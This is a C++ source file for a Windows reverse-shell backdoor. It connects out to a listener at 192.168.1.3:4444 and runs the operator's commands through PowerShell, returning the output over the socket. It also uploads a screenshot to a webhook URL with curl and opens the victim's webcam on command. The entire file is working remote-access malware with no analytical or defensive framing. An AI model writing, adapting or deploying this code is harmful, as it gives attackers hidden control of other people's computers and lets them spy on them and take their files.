#include <iostream>
#include <cstdio>
#include <string>
#include <WS2tcpip.h>
#include <vector>
#include <windows.h>
#include "opencv2/opencv.hpp"
#include <cstring>
#pragma comment(lib, "ws2_32.lib")

using namespace cv;
using namespace std;

WSADATA wsa;
WORD w = WSAStartup(MAKEWORD(2, 2), &wsa);
SOCKET s = socket(AF_INET, SOCK_STREAM, 0);

class NETWORK_TCP
{
public:
	void Send(string buf);
	void Connect(string ip, int port);
	bool check(string dta, char* arr);
	void chdir(char path[110]);
	void webhook(string url);
};

NETWORK_TCP so;

void NETWORK_TCP::Send(string buf)
{
	send(s, buf.c_str(), buf.length(), NULL);
}

void NETWORK_TCP::Connect(string ip, int port)
{
	if (s == INVALID_SOCKET)
	{
		cerr << WSAGetLastError() << endl;
		closesocket(s);
		WSACleanup();
	}
	sockaddr_in sock;
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	inet_pton(AF_INET, ip.c_str(), &sock.sin_addr);
	connect(s, (sockaddr*)&sock, sizeof(sock));
}

bool NETWORK_TCP::check(string dta, char* arr)
{
	int len = dta.length();
	char a = strncmp(dta.c_str(), arr, len) == 0;
	return a;
}

void NETWORK_TCP::chdir(char path[110])
{
	char* r = path;
	r += 3;
	r[strlen(r) - 1] = '\0';
	TCHAR a[100];
	MultiByteToWideChar(CP_ACP, 0, r, -1, a, 100);
	SetCurrentDirectory(a);
}

void NETWORK_TCP::webhook(string url)
{
	string directory = "\"image=@C:\\Users\\vishu\\Pictures\\Screenshots\\1.png\" ";
	string comm = "curl -F ";
	string ur = "-X POST ";
	string l = url;
	string main = comm + directory + ur + l;
	system(main.c_str());
}

void webcam()
{
	//string userpath = getenv("USERPROFILE");
	string path = "C:\\Users\\vishu\\Desktop\\shot.jpg";
	cv::VideoCapture camera(0);
	if (!camera.isOpened()) {
		std::cerr << "ERROR: Could not open camera" << std::endl;
	}

	// create a window to display the images from the webcam
	cv::namedWindow("Webcam", 0);

	// this will contain the image from the webcam
	cv::Mat frame;

	// capture the next frame from the webcam
	camera >> frame;

	// display the frame until you press a key
	while (1) {
		// show the image on the window
		cv::imshow("Webcam", frame);
		// wait (10ms) for a key to be pressed
		if (cv::waitKey(10) >= 0)
			break;
	}
}

int main()
{
	so.Connect("192.168.1.3", 4444);
	while (true)
	{
		string da = "\n[*] >> ";
		so.Send(da);
		char buf[8192];
		ZeroMemory(buf, 8192);
		size_t re = recv(s, buf, 8192, NULL);
		string dta = string(buf, 0, re);

		char* char_arr;
		string str_obj(dta);
		char_arr = &str_obj[0];

		if (so.check("cd ", char_arr))
		{
			so.chdir(char_arr);
		}
		else if (so.check("bye", char_arr))
		{
			string bye = "Bye...\nHope we will meet soon !!\n";
			so.Send(bye);
			closesocket(s);
			WSACleanup();
			break;
		}
		else if (so.check("screen", char_arr))
		{
			int r = dta.find(" ");
			string bu = dta.substr(r + 1);
			so.webhook(bu);
		}
		else if (so.check("webcam", char_arr))
		{
			webcam();
		}
		else
		{
			try
			{
				string ps = "powershell " + dta;
				char buffer[2048];
				string result = "";
				FILE* pipe = _popen(ps.c_str(), "r");
				while (fgets(buffer, sizeof buffer, pipe) != NULL)
				{
					result += buffer;
				}
				cout << result;
				send(s, result.c_str(), result.length(), 0);
				_pclose(pipe);
			}
			catch (exception)
			{
				cerr << "Error\n";
			}			
		}
	}
}
